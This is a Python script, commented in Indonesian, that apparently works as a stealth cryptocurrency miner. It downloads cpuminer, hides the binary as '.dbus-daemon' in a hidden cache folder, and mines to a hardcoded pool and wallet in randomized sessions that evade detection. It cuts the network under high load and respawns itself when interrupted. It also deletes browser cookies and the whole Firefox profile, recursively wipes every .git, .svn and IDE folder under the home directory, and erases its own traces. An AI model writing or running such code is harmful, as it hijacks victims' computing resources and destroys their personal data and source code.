#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random

# Konfigurasi
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:5357"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

# Durasi sesi dan cooldown
MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# Anti suspend terminal
def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

# DNS DoH Bypass
def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# Deteksi penggunaan CPU
def is_cpu_100_percent():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

# Putuskan koneksi internet
def disconnect_network():
    print("[🔌] Memutus koneksi jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "off"])
        subprocess.call(["nmcli", "radio", "wifi", "off"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "down"])
        except:
            pass

# Aktifkan kembali koneksi
def reconnect_network():
    print("[🌐] Mengaktifkan koneksi jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "on"])
        subprocess.call(["nmcli", "radio", "wifi", "on"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "up"])
        except:
            pass

# Evaluasi restart
def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    cooldown_restart_counter += 1
    return cooldown_restart_counter <= cooldown_restart_limit

# Pembersih jejak browser dan mining
def clean_browser_cookies():
    for path in [
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox",
        "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                if os.path.isdir(full):
                    shutil.rmtree(full)
                else:
                    os.remove(full)
                print(f"[🍪] Cookie/jejak dihapus: {full}")
            except:
                pass

def clean_tracking_artifacts():
    for path in [
        "~/.cache/tracker", "~/.config/.tracking"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                shutil.rmtree(full)
                print(f"[🧹] Hapus: {full}")
            except:
                pass

def clean_myapp_data():
    for path in [
        "~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                shutil.rmtree(full)
                print(f"[🧹] MyApp data dihapus: {full}")
            except:
                pass

def clean_source_control():
    for base in ["~", "~/Downloads", "~/.cache", "~/.local/share"]:
        for root, dirs, _ in os.walk(os.path.expanduser(base)):
            for d in [".git", ".svn", ".hg", ".idea", ".vscode", "__pycache__"]:
                path = os.path.join(root, d)
                if os.path.exists(path):
                    try:
                        shutil.rmtree(path)
                        print(f"[🗂️] Source control dihapus: {path}")
                    except:
                        pass

def clean_mining_artifacts():
    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
        for root, _, files in os.walk(os.path.expanduser(base)):
            for f in files:
                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
                    try:
                        os.remove(os.path.join(root, f))
                        print(f"[🧹] Artefak mining dihapus: {f}")
                    except:
                        pass

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE): os.remove(TARFILE)
        if os.path.exists(HIDDEN_DIR): shutil.rmtree(HIDDEN_DIR)
    except: pass

def fake_http_headers():
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Referer: https://google.com/",
        "X-Forwarded-For: 127.0.0.1"
    ]
    os.environ["FAKE_HEADERS"] = "|".join(headers)

# Menjalankan satu sesi penambangan
def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)
    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)
    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[⚙️] Menambang selama {duration} detik...")
    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    if os.path.exists(TARFILE): os.remove(TARFILE)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⛔] CPU 100%! Cooldown {COOLDOWN_DURATION}s")
            disconnect_network()
            proc.terminate()
            time.sleep(COOLDOWN_DURATION)
            if should_restart(): restart_script()
            else: return
    proc.terminate()

# Loop utama
def main_loop():
    while True:
        clean_mining_artifacts()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏸️] Istirahat {pause} detik...\n")
        time.sleep(pause)

# Restart script
def restart_script():
    try:
        print("[🔁] Restarting...")
        clean_miner_cache()
        clean_myapp_data()
        clean_mining_artifacts()
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart: {e}")

# Entry point
if __name__ == "__main__":
    print("🚀  Stealth Miner Final Dimulai...")
    reconnect_network()
    clean_myapp_data()
    clean_browser_cookies()
    clean_tracking_artifacts()
    clean_source_control()
    fake_http_headers()
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    try:
        main_loop()
    except KeyboardInterrupt:
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
